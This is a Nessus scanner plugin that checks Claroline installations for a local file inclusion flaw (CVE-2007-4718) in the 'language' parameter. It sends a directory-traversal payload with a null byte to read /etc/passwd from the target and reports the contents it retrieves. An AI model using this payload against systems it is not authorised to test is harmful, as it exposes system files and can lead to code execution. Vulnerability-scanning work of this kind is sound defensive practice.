#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(26011);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2007-4718");
  script_bugtraq_id(25521);
  script_xref(name:"OSVDB", value:"38987");

  script_name(english:"Claroline inc/lib/language.lib.php language Variable Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file with Claroline");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The version of Claroline installed on the remote host fails to
sanitize user-supplied input to the 'language' parameter before using
it to include PHP code in the 'load_translation' method in
'claroline/inc/lib/language.lib.php'.  Regardless of PHP's
'register_globals' setting, an unauthenticated remote attacker may be
able to exploit this issue to view arbitrary files or to execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id. 

In addition, the version is likely to be affected by several cross-
site scripting issues involving administrative scripts, although
Nessus did not check for them." );
 script_set_attribute(attribute:"see_also", value:"http://www.claroline.net/forum/viewtopic.php?t=13533" );
 script_set_attribute(attribute:"see_also", value:"http://www.claroline.net/wiki/index.php/Changelog_1.8.x" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Claroline 1.8.6 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("claroline_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/claroline"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to retrieve a local file.
  file = "../../../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(method: "GET", port: port,
    item:string(
      dir, "/?",
      "language=", file
    ));
  if (isnull(r)) exit(0);
  res = r[2];
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = res - strstr(res, "<br />");
    report = string(
      "Here are the repeated contents of the file '/etc/passwd' that\n",
      "Nessus was able to read from the remote host :\n",
      "\n",
      contents
    );
    security_warning(port:port, extra:report);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
